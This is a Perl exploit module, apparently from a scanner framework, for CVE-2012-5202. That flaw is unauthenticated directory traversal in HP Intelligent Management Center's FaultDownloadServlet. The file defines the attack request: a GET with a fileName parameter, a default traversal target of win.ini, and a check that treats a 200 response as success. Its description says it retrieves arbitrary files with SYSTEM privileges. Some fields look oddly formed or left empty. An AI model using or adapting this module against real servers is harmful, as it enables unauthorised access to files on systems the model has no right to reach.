package HP::MSF::HpImcFaultdownloadservletTraversal;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "HpImcFaultdownloadservletTraversal";

   my $DETECTION = {

   };

my $EXPLOIT = {
  "CVE" => "CVE-2012-5202",
  "DESCRIPTION" => "

          This module exploits a lack of authentication and a directory traversal in HP

        Intelligent Management, specifically in the FaultDownloadServlet, in order to

        retrieve arbitrary files with SYSTEM privileges. This module has been tested

        successfully on HP Intelligent Management Center 5.1 E0202 over Windows 2003 SP2.

      ",
  "METHOD" => "GET",
  "MSF_MODULE" => "hp_imc_faultdownloadservlet_traversal",
  "OSVDB" => 91027,
  "PATH" => "fileName=__FILENAME__&",
  "PATHS" => ["imc"],
  "THE TITLE OF THE FILE TO DOWNLOAD" => "/windows\\\\win.ini",
  "TITLE" => "HP Intelligent Management FaultDownloadServlet Directory Traversal",
  VARIABLES => {
    'FILENAME' =>       { DESCRIPTION => "", VALUE => "" },
    'PATH' =>       {
  DESCRIPTION => "Path to HP Intelligent Management Center",
  VALUE => "/imc",
},
  },

  TYPE => 'MSF',
  PLATFORM => 'SCANNER',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'GET',
      PATH   => '',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #1 Request : [GET] ',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
